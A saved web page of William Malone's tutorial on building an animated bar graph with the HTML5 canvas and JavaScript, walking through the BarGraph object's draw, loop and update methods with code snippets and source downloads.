<!DOCTYPE html>
<html class="wf-questrial-n4-active wf-fjallaone-n4-active wf-fontawesome-n4-inactive wf-active"><head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8"><title>Create a Bar Graph with HTML5 Canvas { William Malone }</title>
<meta charset="utf-8">
<meta name="author" content="William Malone">
<meta name="description" content="William Malone: Tutorial on how to create a bar graph with HTML5 Canvas and JavaScript.">
<meta name="keywords" content="william malone, html5, html 5, canvas, Javascript, drawing, tutorial">

<meta name="viewport" content="width=device-width,minimum-scale=1,maximum-scale=1">

<meta property="og:title" content="Create a Bar Graph with HTML5 Canvas"><meta property="og:image" content="http://www.williammalone.com/articles/html5-canvas-javascript-bar-graph/images/thumbnail.jpg"><meta property="og:type" content="article"><meta name="twitter:site" content="@williammalone"><link rel="shortlink" href="http://wmalone.com/bargraph"><meta property="og:url" content="http://www.williammalone.com/articles/html5-canvas-javascript-bar-graph/">
<link rel="index" title="William Malone" href="http://www.williammalone.com/">
<link rel="alternate" type="application/rss+xml" title="RSS 2.0" href="http://feeds.feedburner.com/williamMalone">

<link rel="stylesheet" media="screen, projection" type="text/css" href="Create%20a%20Bar%20Graph%20with%20HTML5%20Canvas%20%7B%20William%20Malone%20%7D_files/main.css">


<link rel="stylesheet" href="Create%20a%20Bar%20Graph%20with%20HTML5%20Canvas%20%7B%20William%20Malone%20%7D_files/article.css" media="screen, projection"><link rel="stylesheet" href="Create%20a%20Bar%20Graph%20with%20HTML5%20Canvas%20%7B%20William%20Malone%20%7D_files/style.css" media="screen, projection">
<link rel="stylesheet" href="Create%20a%20Bar%20Graph%20with%20HTML5%20Canvas%20%7B%20William%20Malone%20%7D_files/print.css" media="print">

<script async="" src="Create%20a%20Bar%20Graph%20with%20HTML5%20Canvas%20%7B%20William%20Malone%20%7D_files/analytics.js"></script><script async="" src="Create%20a%20Bar%20Graph%20with%20HTML5%20Canvas%20%7B%20William%20Malone%20%7D_files/typekit-web-font-loader.js"></script><script>// Load fonts via Typekit Web Font Loader (https://github.com/typekit/webfontloader)
WebFontConfig = {
	google: {
		families: ["Fjalla One", "Questrial"]
	}, 
	custom: {
        families: ['fontawesome'],
        urls: [ 'http://www.williammalone.com/css/font-awesome/4.2.0/css/font-awesome.min.css' ]
   }
};

(function() {var wf = document.createElement('script');wf.src='http://sweet.watermelonduck.com/js/typekit-web-font-loader.js';wf.async=1;var s=document.getElementsByTagName('script')[0];s.parentNode.insertBefore(wf, s);})();</script>

<script>// Google Analytics
var _gaq = _gaq || [];_gaq.push(['_setAccount', 'UA-9566612-1']);_gaq.push(['_trackPageview']);

(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),m=s.getElementsByTagName(o)[0];a.src=g;a.async=1;m.parentNode.insertBefore(a,m)})(window,document,'script','//www.google-analytics.com/analytics.js','ga');ga('create', 'UA-9566612-1', 'auto');ga('send', 'pageview');</script>
			
<script>
var WM;

if (!WM) {
	WM={};
}

WM.articleDescription = "Tutorial on how to create a bar graph with HTML5 Canvas and JavaScript.;";
WM.articleShortURL = "wmalone.com/bargraph;";
WM.thumbnailurl = "http://www.williammalone.com/articles/html5-canvas-javascript-bar-graph/images/thumbnail.jpg;";
WM.pageName = "Create a Bar Graph with HTML5 Canvas";

(function () {
	var onWindowLoad = function () {
		
		var loadScript = function (src, callback) {
		
			var element = document.createElement("script");
				element.src = src;
				element.async = true;
				document.body.appendChild(element);
				
				if (callback) {
				
					element.onreadystatechange = function () {
						if (this.readyState === "loaded" || this.readyState === "complete") { 
							callback();
						}
					};
					element.onload = callback;
				}
		},
		
		loadArticleScript = function () {
		loadScript("js/javascript.js");
		};
		loadScript("http://sweet.watermelonduck.com/js/main.js");
			loadArticleScript()
	};

	if (window.addEventListener) {
		window.addEventListener("load", onWindowLoad, false);
	} else if (window.attachEvent) {
		window.attachEvent("onload", onWindowLoad);
	} else {
		window.onload = onWindowLoad;
	}
}());			
</script>
<link href="Create%20a%20Bar%20Graph%20with%20HTML5%20Canvas%20%7B%20William%20Malone%20%7D_files/css.css" rel="stylesheet"><link href="Create%20a%20Bar%20Graph%20with%20HTML5%20Canvas%20%7B%20William%20Malone%20%7D_files/font-awesome.css" rel="stylesheet"><script src="Create%20a%20Bar%20Graph%20with%20HTML5%20Canvas%20%7B%20William%20Malone%20%7D_files/request" async="" type="text/javascript"></script></head>

<body>
    <div id="page">
    	
        <header role="banner">
            
            <a href="http://www.williammalone.com/" id="william-malone-logo" rel="me home" title="William Malone"></a>
            
			<nav role="navigation">
	            <ul id="nav">
	                <li id="home-link" class="nav-link"><a href="http://www.williammalone.com/" rel="home">home</a></li><li id="articles-link-down" class="nav-link nav-down"><a href="http://www.williammalone.com/articles/">articles</a></li><li id="works-link" class="nav-link"><a href="http://www.williammalone.com/works/">works</a></li><li id="about-link" class="nav-link"><a href="http://www.williammalone.com/about/">about</a></li><li id="contact-link" class="nav-link"><a href="http://www.williammalone.com/contact/">contact</a></li>	            </ul>
	            
	            <div style="margin-left: 384px; visibility: visible;" id="nav-down-icon"></div>
				<div style="visibility: hidden;" id="nav-over-icon"></div>
			</nav>
		</header>      


            <div id="content-wrapper" role="main">
            	<aside id="aside" role="complementary">
            		<a class="img william-malone-photo" href="http://www.williammalone.com/about/" title="William Malone"></a>
            			<div id="follow-me-on-twitter">
							<a href="https://twitter.com/williamMalone" target="_blank">
								<div id="follow-me-on-twitter-icon"><i class="fa fa-twitter"></i></div>
							</a>
						</div>
						<div id="add-me-to-google-plus">
							<a href="https://plus.google.com/+WilliamMalone" target="_blank">
								<div id="add-me-to-google-plus-icon"><i class="fa fa-google-plus"></i></div>
							</a>
						</div>
                
<div id="related-container"><section id="related-articles">
	<div class="aside-label">
		<span class="aside-label-word-odd">related</span><span class="aside-label-word-negative">articles</span>
	</div><ul><li class="related-article bubble"><a href="http://www.williammalone.com/articles/create-html5-canvas-javascript-sprite-animation" title="HTML5 Sprite Animation Tutorial" class="subtle-link relatedArticleTitle">HTML5 Sprite Animation Tutorial</a><a href="http://www.williammalone.com/articles/create-html5-canvas-javascript-sprite-animation" title="HTML5 Sprite Animation Tutorial"><img src="Create%20a%20Bar%20Graph%20with%20HTML5%20Canvas%20%7B%20William%20Malone%20%7D_files/thumbnail.jpg"></a></li><li class="related-article bubble"><a href="http://www.williammalone.com/articles/create-html5-canvas-javascript-drawing-app" title="Create HTML5 Drawing App" class="subtle-link relatedArticleTitle">Create HTML5 Drawing App</a><a href="http://www.williammalone.com/articles/create-html5-canvas-javascript-drawing-app" title="Create HTML5 Drawing App"><img src="Create%20a%20Bar%20Graph%20with%20HTML5%20Canvas%20%7B%20William%20Malone%20%7D_files/thumbnail_003.jpg"></a></li><li class="related-article bubble"><a href="http://www.williammalone.com/articles/html5-canvas-example" title="HTML5 Canvas Example" class="subtle-link relatedArticleTitle">HTML5 Canvas Example</a><a href="http://www.williammalone.com/articles/html5-canvas-example" title="HTML5 Canvas Example"><img src="Create%20a%20Bar%20Graph%20with%20HTML5%20Canvas%20%7B%20William%20Malone%20%7D_files/thumbnail_002.jpg"></a></li></ul></section><section id="related-briefs">
	<div class="aside-label">
		<span class="aside-label-word-odd">related</span><span class="aside-label-word-negative">briefs</span>
	</div><ul><li class="relatedBrief bubble"><div class="briefQuestionMark"><i class="fa fa-question-circle"></i></div><a href="http://www.williammalone.com/briefs/how-to-draw-rectangle-html5-canvas" title="How do you draw a rectangle on HTML5 canvas?" class="subtle-link briefListing">How do you draw a rectangle on HTML5 canvas?</a></li></ul></section></div>				

</aside>
<div id="content">
<article role="article" itemscope="" itemtype="http://schema.org/BlogPosting">      

           
                                     		<h1>Create a Bar Graph with HTML5 Canvas and JavaScript</h1>
                    <div class="author"><span id="by">by</span> William Malone</div>
                    <p>This tutorial will show how to create a simple 
bar graph on an HTML5 Canvas using JavaScript. The code is available at 
the end of the article for download.</p>
                    <p>The example below represents the number of sightings of watermelon duck by region updated each second.</p>
                    <div class="image">
                    	<p><em>Watermelon Duck Sightings by Region</em></p>
    					<div id="graph1"><canvas></canvas></div>
    				</div>
                    <p>First we will look at the bar graph and what it 
can do, followed by an example of the graph in action. Then we go step 
by step through the code and learn how it was done. You can download the
 source code at the <a href="#download">end of the article</a>.</p>
                    <h2>Introducing the HTML5 Bar Graph</h2>
                    
                    <p>The bar graph we are going to create displays a 
list of rectangles of varying height proportional to the values they 
represent. The number of bars, their values and labels are all inputs. 
If the values change the heights will animate from the old to the new 
value.</p>
                    <div class="image">
				    	<div id="graph2"><canvas height="150" width="450"></canvas></div>
				    </div>
				    <p>The bar graph has many properties that describe how the data 
is displayed including color, margin and speed. Many of these properties
 are configurable including:</p>
                    <table class="properties">
                        <tbody><tr>
                            <td>width</td>
                            <td>The total width of the graph</td>
                        </tr>
                        <tr>
                            <td>height</td>
                            <td>The total height of the graph including the x-axis labels (if included)</td>
                        </tr>
                        <tr>
                            <td>colors</td>
                            <td>An array of colors (e.g. ["red", 
"white", "#0000FF"]). If the number of bars is greater than the number 
of colors the colors will repeat</td>
                        </tr>
                        <tr>
                            <td>margin</td>
                            <td>The amount of space in pixels required between bars</td>
                        </tr>
                        <tr>
                            <td>backgroundColor</td>
                            <td>The color behind everything</td>
                        </tr>
                        <tr>
                            <td>maxValue</td>
                            <td>The maximum value. If this value is not 
defined then the heights will all be proportional to the largest value 
of all the current values</td>
                        </tr>
                    </tbody></table>
                    <h2>Usage Example</h2>
                    
                    <p>Let's look at a practical example. If I wanted to
 show a graph representing my car horn behavior last week this is what 
the graph looks like (Friday was a bad day):</p>
                    <div class="image">
                    	<p><em>Number of Times I Honked My Horn This Week</em></p>
						<img src="Create%20a%20Bar%20Graph%20with%20HTML5%20Canvas%20%7B%20William%20Malone%20%7D_files/bar-example-border-gradient-shadow-value-label.png" title="HTML5 rectangle example" height="150" width="450">
    				</div>
                    <p>The markup contains a few key items: the canvas 
where the graph will be drawn, the bar graph script (barGraph.js) and 
the custom script that describes the graph. If you want support for 
Internet Explorer you need to add the <a href="http://code.google.com/p/explorercanvas/" title="ExplorerCanvas" target="_blank">ExplorerCanvas</a> script (excanvas.js).</p>
                    <pre class="code html">&lt;!DOCTYPE html&gt;
&lt;html&gt;
  &lt;head&gt;
    &lt;title&gt;HTML5 Bar Graph&lt;/title&gt;
  &lt;/head&gt;
  &lt;body&gt;
    &lt;canvas id="canvasId"&gt;&lt;/canvas&gt;
    &lt;!--[if IE]&gt;&lt;script src="excanvas.js"&gt;&lt;/script&gt;&lt;![endif]--&gt;
    &lt;script src="barGraph.js"&gt;&lt;/script&gt;
    &lt;script&gt;
      // ... MY CODE ...
    &lt;/script&gt;
  &lt;/body&gt;
&lt;/html&gt;</pre>
                    <p>In between those script tags with the "... MY 
CODE..." comment we add some code create a new bar graph with the 
canvas's context as the only parameter.  We set a few of its properties 
like margin and dimensions and update the graph with the values we want 
to display.</p>
                    <pre class="code js">var cxt = document.getElementById("canvasId").getContext("2d");
                        
var graph = new BarGraph(ctx);
graph.margin = 2;
graph.width = 450;
graph.height = 150;
graph.xAxisLabelArr = ["Sun", "Mon", "Tue", "Wed", "Thu", "Fri", "Sat"];
graph.update([3, 5, 3, 4, 4, 13, 2]);</pre>
                    <h2>The Code Explained</h2>
                    
                    <p>Next we take a look at the code. If you just want to use the code you can download the source code <a href="#download">at the bottom</a>. If you want to learn strap in and here we go...</p>                    
                    <h2>The BarGraph Object</h2>
                    
                    <p>The BarGraph function takes one parameter called 
"ctx" which corresponds to the context of the canvas on which to draw 
the bar graph. In addition to the context parameter the function has 
private and public variables and methods.  Let's start with pieces of 
the BarGraph we want to keep private.</p>
                    <pre class="code js">function BarGraph(ctx) {

  // Private properties and methods
	
  var that = this;
  var startArr;
  var endArr;
  var looping = false;
		
  // Loop method adjusts the height of bar and redraws if neccessary
  var loop = function () {
    ...
  };
		
  // Draw method updates the canvas with the current display
  var draw = function (arr) { 
     ...
  };</pre>
					<p>First we declare a variable called "that" which is assigned to 
the "this" parameter that will be used to access the BarGraph object 
from inside the functions we will create in a bit. The variables 
"startArr" and and "endArr" will be used to store the array of values 
from during animation.  The "looping" variable will be used as a boolean
 to store if the bar graph is currently animating or not.</p>
                    <p>Next we declare a couple of functions called loop
 and draw. The loop function that will be used in animation.  The draw 
function is declared that will be used to redraw the graph.</p>
                    <p>We also create some variables and functions that 
are public that can be used to update the graph. Note to make these 
public we augment the "this" parameter instead of declaring with the 
"var" keyword.</p>
                    <pre class="code js">  // Public properties and methods
	
  this.width = 300;
  this.height = 150;	
  this.maxValue;
  this.margin = 5;
  this.colors = ["purple", "red", "green", "yellow"];
  this.curArr = [];
  this.backgroundColor = "#fff";
  this.xAxisLabelArr = [];
  this.yAxisLabelArr = [];
  this.animationInterval = 100;
  this.animationSteps = 10;
	
  // Update method sets the end bar array and starts the animation
  this.update = function (newArr) {
    ...
  };
}</pre>
                    <h2>The Draw Method</h2>
                    
                    <p>The draw method updates the canvas with the bar 
values specified by the array parameter called "arr". This function is 
private and cannot be invoked directly however it is called internally 
multiple times while animating from one value to another.</p>
                    <pre class="code js">var draw = function (arr) {
                        
  var numOfBars = arr.length;
  var barWidth;
  var barHeight;
  var border = 2;
  var ratio;
  var maxBarHeight;
  var gradient;
  var largestValue;
  var graphAreaX = 0;
  var graphAreaY = 0;
  var graphAreaWidth = that.width;
  var graphAreaHeight = that.height;
  var i;</pre>
					<p>We declare several variables that will be used inside the 
function. In addition we set the initial value of a few of the variables
 such as "numOfBars" to the the array length, the graph area position to
 zero and it graph area dimensions to the width and height of the graph 
object.</p>
                    <pre class="code js">  // Update the dimensions of the canvas only if they have changed
  if (ctx.canvas.width !== that.width || ctx.canvas.height !== that.height) {
    ctx.canvas.width = that.width;
    ctx.canvas.height = that.height;
  }
			
  // Draw the background color
  ctx.fillStyle = that.backgroundColor;
  ctx.fillRect(0, 0, that.width, that.height);
				
  // If x axis labels exist then make room	
  if (that.xAxisLabelArr.length) {
    graphAreaHeight -= 40;
  }
			
  // Calculate dimensions of the bar
  barWidth = graphAreaWidth / numOfBars - that.margin * 2;
  maxBarHeight = graphAreaHeight - 25;
			
  // Determine the largest value in the bar array
  var largestValue = 0;
  for (i = 0; i &lt; arr.length; i += 1) {
    if (arr[i] &gt; largestValue) {
      largestValue = arr[i];	
    }
  }</pre>
                    <p>First we check if the graph dimensions and 
changed and update them if there is a change.  We don't want to set the 
canvas width or height unless there is a change because it forces a 
redraw.</p>
                    <p>Next we fill the background of the graph with the
 value set by the public variable "backgroundColor". If there are any 
labels set for the x axis then we subtract some pixels from the 
"graphAreaHeight" variable to make room.</p>
                    <p>The bar's size is determined by dividing the graph into equal sections minus the margin between each bar.</p>
                    <p>Finally the maximum value of the "arr" parameter 
is determined by looping through and updating the "largestValue" 
variable when it is bigger.</p>
                    <pre class="code js">  // For each bar
  for (i = 0; i &lt; arr.length; i += 1) {
    // Set the ratio of current bar compared to the maximum
    if (that.maxValue) {
      ratio = arr[i] / that.maxValue;
    } else {
      ratio = arr[i] / largestValue;
    }
    
    barHeight = ratio * maxBarHeight;</pre>
                    <p>Next we iterate through each bar in the array and
 determine the its height based on the target value and the maximum 
height. If the "maxValue" property has been set then we use that as the 
maximum, if not we use the largest value in the parameter array. Using 
the ratio we set the height of the current bar.</p>
                    <p>The next step is to draw the background of each bar.</p>
                    <div class="image">
                    	<div><img src="Create%20a%20Bar%20Graph%20with%20HTML5%20Canvas%20%7B%20William%20Malone%20%7D_files/bar-example-border-shadow.png" title="HTML5 bar border with shadow example" height="100" width="450"></div>
                    </div>
                    <pre class="code js">    // Turn on shadow
    ctx.shadowOffsetX = 2;
    ctx.shadowOffsetY = 2;
    ctx.shadowBlur = 2;
    ctx.shadowColor = "#999";
					
    // Draw bar background
    ctx.fillStyle = "#333";			
    ctx.fillRect(that.margin + i * that.width / numOfBars,
      graphAreaHeight - barHeight,
      barWidth,
      barHeight);
		
    // Turn off shadow
    ctx.shadowOffsetX = 0;
    ctx.shadowOffsetY = 0;
    ctx.shadowBlur = 0;</pre>
                    <p>To set the shadow we set a value to the canvas' 
context's shadow properties something other than zero. In this case we 
set the color to a light gray (#999) with offset and blur of two pixels.
 We draw the bar background rectangle with the context's "fillRect" 
method with the dark gray border color ("#333").</p>
                    <p>To prevent the next objects from having a shadow we set the shadow properties to zero.</p>
                    <pre class="code js">    // Create gradient
    gradient = ctx.createLinearGradient(0, 0, 0, graphAreaHeight);
    gradient.addColorStop(1-ratio, that.colors[i % that.colors.length]);
    gradient.addColorStop(1, "#ffffff");</pre>
                    <p>To create the bar gradient we use the 
"createLinearGradient" method to set the gradient height.  The 
"addColorStop" method defines the percentage of the height where each 
color starts as well as the destination color.</p>
                    <div class="image">
    					<div><img src="Create%20a%20Bar%20Graph%20with%20HTML5%20Canvas%20%7B%20William%20Malone%20%7D_files/bar-example-border-gradient-shadow.png" title="HTML5 rectangle example" height="100" width="450"></div>
    				</div>
                    <pre class="code js">    ctx.fillStyle = gradient;
    // Fill rectangle with gradient
    ctx.fillRect(that.margin + i * that.width / numOfBars + border,
      graphAreaHeight - barHeight + border,
      barWidth - border * 2,
      barHeight - border * 2);</pre>
                    <p>Fill the bar with the gradient with the "fillRect" method.</p>
                    <p>We also want to display a text label on top of each bar. Note this is not currently supported in Internet Explorer.</p>
                    <div class="image">
    					<div><img src="Create%20a%20Bar%20Graph%20with%20HTML5%20Canvas%20%7B%20William%20Malone%20%7D_files/bar-example-border-gradient-shadow-value.png" title="HTML5 rectangle example" height="120" width="450"></div>
    				</div>
                    <pre class="code js">    // Write bar value
    ctx.fillStyle = "#333";
    ctx.font = "bold 12px sans-serif";
    ctx.textAlign = "center";
    // Use try / catch to stop IE 8 from going to error town
    try {
      ctx.fillText(parseInt(arr[i],10),
        i * that.width / numOfBars + (that.width / numOfBars) / 2,
        graphAreaHeight - barHeight - 10);
    } catch (ex) {}</pre>
                    <p>To draw the bar value text on top of the bar we 
set the context's "font" property and then call the "fillText" property 
with the current bar's value.</p>
                    <p>Lastly we want to add the label under the X axis if it was specified.</p>
                    <div class="image">
    					<div><img src="Create%20a%20Bar%20Graph%20with%20HTML5%20Canvas%20%7B%20William%20Malone%20%7D_files/bar-example-border-gradient-shadow-value-label.png" title="HTML5 rectangle example" height="150" width="450"></div>
    				</div>
                    <pre class="code js">    // Draw bar label if it exists
    if (that.xAxisLabelArr[i]) {				
      // Use try / catch to stop IE 8 from going to error town				
      ctx.fillStyle = "#333";
      ctx.font = "bold 12px sans-serif";
      ctx.textAlign = "center";
      try {
        ctx.fillText(that.xAxisLabelArr[i],
          i * that.width / numOfBars + (that.width / numOfBars) / 2,
          that.height - 10);
        } catch (ex) {}
      }
    }
  }; // End draw method</pre>
                    <h2>The Loop Method</h2>
                    
                    <p>The loop method is private like the draw method 
meaning it cannot be invoked directly. It is called by the update method
 when a change in bar values is detected. Its responsibilty is to 
determine the amount each bar should change and then call the draw 
method to display that change. More simply it is the animator.</p>
                    <pre class="code js">var loop = function () {

  var delta;
  var animationComplete = true;

  // Boolean to prevent update function from looping if already looping
  looping = true;</pre>
                    <p>The local "delta" variable will be used to save 
the amount each bar is changed in height. The local "animationComplete" 
variable is initially set to true. The "looping" variable is set to true
 so the knows the loop function is running and will not call it.</p>
					<pre class="code js">  // For each bar
  for (var i = 0; i &lt; endArr.length; i += 1) {
    // Change the current bar height toward its target height
    delta = (endArr[i] - startArr[i]) / that.animationSteps;
    that.curArr[i] += delta;
    // If any change is made then flip a switch
    if (delta) {
      animationComplete = false;
    }
  }</pre>
                    <p>We loop through each bar and set the amount the 
bar should change based on the start and end array and the amount of 
frames in the variable "animationSteps". If there is any change then 
change the "animationComplete" variable so we know we need to continue.</p>
                    <pre class="code js">			
  // If no change was made to any bars then we are done
  if (animationComplete) {
    looping = false;
  } else {
    // Draw and call loop again
    draw(that.curArr);
    setTimeout(loop, that.animationInterval / that.animationSteps);
  }
}; // End loop function</pre>
                    <p>If no changes were detected then we stop, 
otherwise we call the "draw" method with the updated graph array and use
 "setTimeout" to call the "loop" method again.</p>
                    <h2>The Update Method</h2>
                    
                    <p>To update the bar graph we call the update method with an array of the new values of the bar graph.</p>
                    <pre class="code js">this.update = function (newArr) {

  // If length of target and current array is different 
  if (that.curArr.length !== newArr.length) {
    that.curArr = newArr;
    draw(newArr);
  } else {
    // Set the starting array to the current array
    startArr = that.curArr;
    // Set the target array to the new array
    endArr = newArr;
    // Animate from the start array to the end array
    if (!looping) {	
      loop();
    }
  }
}; // End update method</pre>
					<p>First thing we check is if the new values are different from the
 current values.  If the values are the same we update the current array
 with the new array and call the "draw" method to update the view.</p>
                    <p>If the target array is different from the current
 array then we update the start and end array variables and call the 
"loop" method.</p>
                    <div class="image">
    					<div id="graph3"><canvas height="150" width="450"></canvas></div>
    				</div>
                    <a name="download"></a>
                    <h2>Download Source Code</h2>
                    
                    <ul>
                        <li>Download HTML5 Bar Graph (All Files): <a href="http://www.williammalone.com/articles/html5-canvas-javascript-bar-graph/downloads/html5-canvas-bar-graph.zip" title="Download HTML5 Bar Graph">html5-canvas-bar-graph.zip</a></li>
                        <li>Download HTML5 Bar Graph (HTML): <a href="http://www.williammalone.com/articles/html5-canvas-javascript-bar-graph/downloads/html5-canvas-bar-graph.html" title="Download HTML">html5-canvas-bar-graph.html</a></li>
                        <li>Download HTML5 Bar Graph (JavaScript): <a href="http://www.williammalone.com/articles/html5-canvas-javascript-bar-graph/downloads/html5-canvas-bar-graph.js" title="Download JavaScript">html5-canvas-bar-graph.js</a></li>
                    </ul>
                    


                            <h2>Share This Article</h2>
                            <ul id="contentShareList">
                            
								<li class="twitterShare shareListItem">
									<a class="subtle-link" href="https://twitter.com/intent/tweet?url=http%3A%2F%2Fwmalone.com%2Fbargraph&amp;text=Create+a+Bar+Graph+with+HTML5+Canvas" target="_blank" title="Share on Twitter"> 
										<div class="brand-circle">
											<div class="brand-circle-icon"><i class="fa fa-twitter"></i></div>
										</div>
									</a>
								</li>

								<li class="facebookShare shareListItem">
									<a class="subtle-link" href="http://www.facebook.com/sharer.php?u=http%3A%2F%2Fwmalone.com%2Fbargraph&amp;t=Create+a+Bar+Graph+with+HTML5+Canvas" target="_blank" title="Share on Facebook"> 
										<div class="brand-circle">
											<div class="brand-circle-icon"><i class="fa fa-facebook"></i></div>
										</div>
									</a>
								</li>
								
								<li class="diggShare shareListItem">
									<a class="subtle-link" href="http://digg.com/submit?url=http%3A%2F%2Fwmalone.com%2Fbargraph&amp;title=Create+a+Bar+Graph+with+HTML5+Canvas" target="_blank" title="Share on Digg">
										<div class="brand-circle">
											<div class="brand-circle-icon"><i class="fa fa-digg"></i></div>
										</div>
									</a>
								</li>
								
								<li class="deliciousShare shareListItem">
									<a class="subtle-link" href="http://delicious.com/save?v=5&amp;noui&amp;jump=close&amp;url=http%3A%2F%2Fwmalone.com%2Fbargraph&amp;title=Create+a+Bar+Graph+with+HTML5+Canvas" target="_blank" title="Share on Delicious">
										<div class="brand-circle">
											<div class="brand-circle-icon"><i class="fa fa-delicious"></i></div>
										</div>
									</a>
								</li>
								
								<li class="redditShare shareListItem">
									<a class="subtle-link" href="http://reddit.com/submit?url=http%3A%2F%2Fwmalone.com%2Fbargraph&amp;title=Create+a+Bar+Graph+with+HTML5+Canvas" target="_blank" title="Share on Reddit">
										<div class="brand-circle">
											<div class="brand-circle-icon"><i class="fa fa-reddit"></i></div>
										</div>
									</a>
								</li>
								
								<li class="googlePlusOneShare shareListItem">
									<a class="subtle-link" href="https://plus.google.com/share?url=http%3A%2F%2Fwmalone.com%2Fbargraph&amp;title=Create+a+Bar+Graph+with+HTML5+Canvas" target="_blank" title="Share on Google+">
										<div class="brand-circle">
											<div class="brand-circle-icon"><i class="fa fa-google-plus"></i></div>
										</div>
									</a>
								</li>
                            </ul>
									<h2>Related Articles</h2>
									
									<div id="related-containerEOD">

									<ul><li class="related-article bubble"><a href="http://www.williammalone.com/articles/create-html5-canvas-javascript-sprite-animation" title="HTML5 Sprite Animation Tutorial" class="subtle-link related-article-title">HTML5 Sprite Animation Tutorial</a><a href="http://www.williammalone.com/articles/create-html5-canvas-javascript-sprite-animation" title="HTML5 Sprite Animation Tutorial"><img src="Create%20a%20Bar%20Graph%20with%20HTML5%20Canvas%20%7B%20William%20Malone%20%7D_files/thumbnail.jpg"></a></li><li class="related-article bubble"><a href="http://www.williammalone.com/articles/create-html5-canvas-javascript-drawing-app" title="Create HTML5 Drawing App" class="subtle-link related-article-title">Create HTML5 Drawing App</a><a href="http://www.williammalone.com/articles/create-html5-canvas-javascript-drawing-app" title="Create HTML5 Drawing App"><img src="Create%20a%20Bar%20Graph%20with%20HTML5%20Canvas%20%7B%20William%20Malone%20%7D_files/thumbnail_003.jpg"></a></li><li class="related-article bubble"><a href="http://www.williammalone.com/articles/html5-canvas-example" title="HTML5 Canvas Example" class="subtle-link related-article-title">HTML5 Canvas Example</a><a href="http://www.williammalone.com/articles/html5-canvas-example" title="HTML5 Canvas Example"><img src="Create%20a%20Bar%20Graph%20with%20HTML5%20Canvas%20%7B%20William%20Malone%20%7D_files/thumbnail_002.jpg"></a></li></ul></div>                        </article></div>
                    </div>

					<footer>


			<ul id="footer-icon-nav">
				<li class="footer-icon">
					<a href="http://www.twitter.com/williamMalone/" target="_blank" rel="me" title="William Malone's Status on Twitter">
						<div class="brand-circle">
							<div class="brand-circle-icon footerIcon" id="twitter">
								<i class="fa fa-twitter"></i>
							</div>
						</div>
					</a>
				</li>
				<li class="footer-icon">
					<a href="http://www.linkedin.com/in/williammalone/" target="_blank" rel="me" title="William Malone's Profile on LinkedIn">
						<div class="brand-circle">
							<div class="brand-circle-icon footerIcon" id="linkedIn">
								<i class="fa fa-linkedin"></i>
							</div>
						</div>
					</a>
				</li>
				<li class="footer-icon">
					<a href="http://www.flickr.com/williamMalone/" target="_blank" rel="me" title="William Malone's Photos on flickr">
						<div class="brand-circle">
							<div class="brand-circle-icon footerIcon" id="flickr">
								<i class="fa fa-flickr"></i>
							</div>
						</div>
					</a>
				</li>
				<li class="footer-icon">
					<a href="https://github.com/williammalone" target="_blank" rel="me" title="William Malone's github Repos">
						<div class="brand-circle">
							<div class="brand-circle-icon footerIcon" id="github">
								<i class="fa fa-github"></i>
							</div>
						</div>
					</a>
				</li>
				<li class="footer-icon">
					<a href="https://plus.google.com/u/0/118308667806315333482?rel=author" target="_blank" rel="me" title="William Malone's Google Profile">
						<div class="brand-circle">
							<div class="brand-circle-icon footerIcon" id="googlePlus">
								<i class="fa fa-google-plus"></i>
							</div>
						</div>
					</a>
				</li>
				<li class="footer-icon">
					<a href="http://feeds.feedburner.com/williamMalone" target="_blank" rel="me" title="William Malone's RSS">
						<div class="brand-circle">
							<div class="brand-circle-icon footerIcon" id="rss">
								<i class="fa fa-rss"></i>
							</div>
						</div>
					</a>
				</li>
			</ul>          
<nav id="footer-text-nav">
	<a href="http://www.williammalone.com/" class="footer-text-link subtle-link mobile-button" rel="me home" title="Home">Home</a><a href="http://www.williammalone.com/articles/" class="footer-text-link subtle-link mobile-button" rel="tag" title="Articles">Articles</a><a href="http://www.williammalone.com/briefs/" class="footer-text-link subtle-link mobile-button" rel="tag" title="Briefs">Briefs</a><a href="http://www.williammalone.com/posts/" class="footer-text-link subtle-link mobile-button" rel="tag" title="Posts">Posts</a><a href="http://www.williammalone.com/works/" class="footer-text-link subtle-link mobile-button" rel="tag" title="Works">Works</a><a href="http://www.williammalone.com/resume/" class="footer-text-link subtle-link mobile-button" rel="tag" title="Resume">Resume</a><a href="http://www.williammalone.com/about/" class="footer-text-link subtle-link mobile-button" rel="tag" title="About">About</a><a href="http://www.williammalone.com/contact/" class="footer-text-link subtle-link mobile-button" rel="tag" title="Contact">Contact</a><a href="http://feeds.feedburner.com/williamMalone" class="footer-text-link subtle-link mobile-button" rel="tag me" target="_blank" title="RSS">RSS</a><a href="http://www.williammalone.com/sitemap/" class="footer-text-link subtle-link mobile-button" rel="sitemap tag" title="Sitemap">Sitemap</a>
</nav>

<small id="copyright" role="contentinfo">This site <a href="http://www.williammalone.com/" class="subtle-link" rel="home" title="Home">williammalone.com</a> and its contents <a href="http://creativecommons.org/licenses/by-sa/3.0/" class="subtle-link" title="Creative Commons — Attribution-Share Alike 3.0 Unported" rel="license">copyright</a> © 2014 <a href="http://www.williammalone.com/about/" class="subtle-link" title="William Malone">William Malone</a>. It is not affiliated with, sponsored by, or endorsed by any entity other than yours truely: <a href="http://www.williammalone.com/about/" class="subtle-link" title="William Malone">William Malone</a>.</small>

</footer>

